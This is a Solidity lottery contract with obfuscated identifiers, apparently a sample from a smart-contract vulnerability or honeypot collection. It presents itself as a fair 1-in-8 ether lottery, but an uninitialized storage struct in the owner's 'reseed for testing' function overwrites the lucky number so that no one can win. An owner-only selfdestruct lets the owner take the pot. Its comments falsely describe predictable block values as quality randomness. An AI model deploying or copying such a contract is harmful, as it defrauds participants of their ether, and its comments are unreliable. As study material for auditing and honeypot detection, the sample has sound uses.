// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x31058f;
        uint _0x44c1b2;
        uint _0xc5f134;
        uint _0x8ae638;
    }

    address _0x07e078; //address of the owner
    uint private _0xeabe7e; //seed used to calculate number of an address
    uint private _0xa1339d; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0xa65d10; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0x07e078 = msg.sender;
        _0xfaa4b1(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xee4597() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0xa65d10[msg.sender] == false);

        if(_0x5a07ac(msg.sender) == LuckyNumber){ //check if it equals 7
            _0xa65d10[msg.sender] = true; // every address can only win once

            uint _0x479723=msg.value*7; //win = 7 times the ticket price

            if(_0x479723>this.balance) //if the balance isnt sufficient...
                _0x479723=this.balance; //...send everything we've got
            msg.sender.transfer(_0x479723);
        }

        if(block.number-_0xa1339d>1000) //reseed if needed
            _0xfaa4b1(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x5a07ac(address _0xb2ce83) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x6c3afc(uint(_0xb2ce83), _0xeabe7e)[0]) % 8;
    }

    function _0xfaa4b1(SeedComponents _0xd95aa3) internal {
        _0xeabe7e = uint256(_0x6c3afc(
            _0xd95aa3._0x31058f,
            _0xd95aa3._0x44c1b2,
            _0xd95aa3._0xc5f134,
            _0xd95aa3._0x8ae638
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0xa1339d = block.number;
    }

    function _0x68a561() {
        require(msg.sender==_0x07e078);

        selfdestruct(msg.sender);
    }

    function _0x35ab1d() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0x07e078);
        SeedComponents s;
        s._0x31058f = uint(msg.sender);
        s._0x44c1b2 = uint256(block.blockhash(block.number - 1));
        s._0xc5f134 = block.difficulty*(uint)(block.coinbase);
        s._0x8ae638 = tx.gasprice * 7;

        _0xfaa4b1(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0x07e078) //owner can't participate, he can only fund the jackpot
            _0xee4597();
    }

}
